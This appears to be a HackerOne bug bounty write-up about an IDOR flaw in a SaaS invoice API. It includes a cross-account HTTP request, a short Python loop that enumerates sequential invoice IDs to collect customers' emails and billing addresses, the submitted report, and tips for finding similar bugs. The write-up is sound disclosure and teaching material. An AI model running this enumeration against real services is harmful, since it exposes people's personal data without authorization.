---
title: "IDOR on an Internal Billing API"
slug: "idor-billing-api"
platform: "hackerone"
vuln_class: "IDOR"
difficulty: "easy"
scope_type: "web"
bounty: 3133
program: "Confidential — HackerOne"
published_at: "2024-02-10"
tags: ["idor", "api", "web", "beginner", "account-takeover"]
teaser: "A predictable invoice ID and a missing ownership check turned into full account data exposure — no special tools required, just a proxy and curiosity about sequential numbers."
---

## The Program

This was a mid-sized SaaS company running a private bug bounty on HackerOne. The program had been open for about 14 months, accepted web and API targets, and had a clear bounty table: up to $3,000 for critical, $500–$1,500 for high.

The scope included `app.target.com` and its API at `api.target.com`. The program explicitly called out "business logic flaws" as in-scope, which is a green flag — it means the team has thought about these issues and is willing to pay for them.

**Why this program?** Low competition signals: 38 resolved reports total, response efficiency at 82%, and the program had last updated its scope 3 weeks prior (new endpoints often mean new attack surface).

---

## The Recon

The first 45 minutes were spent on passive mapping: browsing the app as a free user, watching Burp Suite capture every request.

Three things stood out:

1. The billing section made calls to `/api/v1/invoices/{id}` where `{id}` was a 6-digit integer.
2. Creating a second free account and generating an invoice produced ID `102847` — while the first account had produced `102841`. The IDs were sequential and close together.
3. The `/invoices/{id}` response included not just the invoice data, but also `customer_email`, `customer_name`, and `billing_address`.

The setup was classic IDOR conditions: predictable identifiers, no visible authorization token in the path, and a response that returned more than just the document itself.

---

## The "Wait a Second..." Moment

After noticing the sequential IDs, the next step was simple: request an invoice that belonged to a *different* account.

```http
GET /api/v1/invoices/102842 HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJ0eXAiOiJKV1Q...  ← token of Account A
```

The response came back with a 200 OK — and the full invoice data for Account B, including their name, email, and billing address.

No error. No redirect. No rate limiting. The backend was checking "is this user authenticated?" but not "does this invoice belong to this user?"

The key mental model here: **authentication** (are you logged in?) and **authorization** (are you allowed to access *this specific resource*?) are two separate checks. Applications often implement authentication correctly while forgetting authorization at the resource level.

---

## The Exploit

To demonstrate impact beyond a single record, a simple Python script iterated through a range of invoice IDs:

```python
import requests

headers = {"Authorization": "Bearer YOUR_TOKEN"}
base_url = "https://api.target.com/api/v1/invoices/{}"

for invoice_id in range(102800, 102860):
    r = requests.get(base_url.format(invoice_id), headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"{invoice_id}: {data['customer_email']} — {data['billing_address']}")
```

Output showed 47 valid invoices, all from different customers, exposing PII across the entire range. This elevated the severity from "interesting" to "critical" — it wasn't a one-off leak, it was a mass enumeration vulnerability.

**Important**: the script was run only far enough to confirm mass exploitability (about 60 requests). Extracting real customer data at scale would have been out of scope and unethical — the point was to prove the issue, not exploit it.

---

## The Report

The report was structured around three things: **what** the issue was, **how** to reproduce it, and **what the impact was**.

```
Title: IDOR on /api/v1/invoices/{id} allows mass enumeration of customer PII

Summary:
The invoice endpoint does not verify that the authenticated user owns the
requested invoice. Any authenticated user can access invoices belonging to
other customers by iterating the numeric invoice ID.

Steps to Reproduce:
1. Create Account A, generate an invoice (note the ID, e.g. 102841)
2. Create Account B, generate an invoice (note the ID, e.g. 102847)
3. While authenticated as Account A, request:
   GET /api/v1/invoices/102842
4. Observe: 200 OK with Account B's invoice data including PII

Impact:
Full name, email, and billing address of any customer can be retrieved
by any other authenticated user. IDs are sequential and enumerable.
Estimated exposure: all invoices in the system (~100k+ records).

CVSS: 8.1 (High) — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
```

The program triaged the report in 6 hours and confirmed it as Critical (bumping it from the CVSS High due to business impact). Full bounty paid in 11 days.

---

## The Takeaway

**The one-sentence insight**: any time you see a numeric ID in an API path, check whether the server validates ownership — not just authentication.

**How to find similar bugs on other programs:**
- Map all API endpoints that accept resource IDs (invoice, order, ticket, document, user)
- Check if IDs are sequential, UUIDs (harder to enumerate), or something in between
- Create two accounts, generate the same resource type on both, and cross-request
- Look at the *response* carefully — even a 403 that leaks data in the body counts

**Common beginner mistakes on this bug class:**
- Stopping after finding one instance instead of demonstrating mass impact
- Only testing GETs — check PUT, PATCH, DELETE too (often the same missing check lets you *modify* other users' records)
- Not testing authenticated endpoints — IDORs behind login are still IDORs
